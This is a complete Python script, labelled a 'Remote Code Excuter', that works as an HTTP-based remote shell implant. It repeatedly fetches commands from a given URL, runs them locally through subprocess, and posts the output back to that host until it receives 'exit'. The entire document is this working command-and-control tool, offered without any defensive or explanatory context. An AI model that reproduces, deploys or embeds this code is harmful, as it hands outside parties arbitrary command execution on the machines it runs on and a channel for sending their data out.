import subprocess
import time
import argparse
import requests
import logging


def parse_arguments():
    parser = argparse.ArgumentParser(description="Remote Code Excuter")
    parser.add_argument("target_url", type=str, help="Target URL to send commands to. like http://127.0.0.1:9999")
    parser.add_argument(
        "-sleep", default=3, type=int, help="Time to wait between reqeuests in seconds."
    )
    return parser.parse_args()


def execute_command(command):
    try:
        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        output, error = process.communicate()
        return output.decode("utf-8"), error.decode("utf-8")
    except Exception as e:
        logging.info("Error in Executing Command {}".format(e))
        return "", str(e)


def post_request(target_url, output, error):
    try:
        if output:
            requests.post(target_url, data=output)
        elif error:
            requests.post(target_url, data=error)
    except requests.exceptions.RequestException as e:
        logging.error("Unable to Send Request : {}".format(e))


def main():
    args = parse_arguments()
    target_url = args.target_url
    sleep_time = args.sleep

    while True:
        try:
            response = requests.get(target_url)
            command = response.text.strip()
            if command.lower().strip() == "exit":
                logging.info("Terminating from Tool")
                break
            else:
                logging.info("Executing Commands: {}".format(command))
                output, error = execute_command(command)
                post_request(target_url, output, error)
                time.sleep(sleep_time)
        except requests.exceptions.RequestException as e:
            logging.error("Error in Sending Requests: {}".format(e))
            time.sleep(sleep_time)


if __name__ == "__main__":
    main()
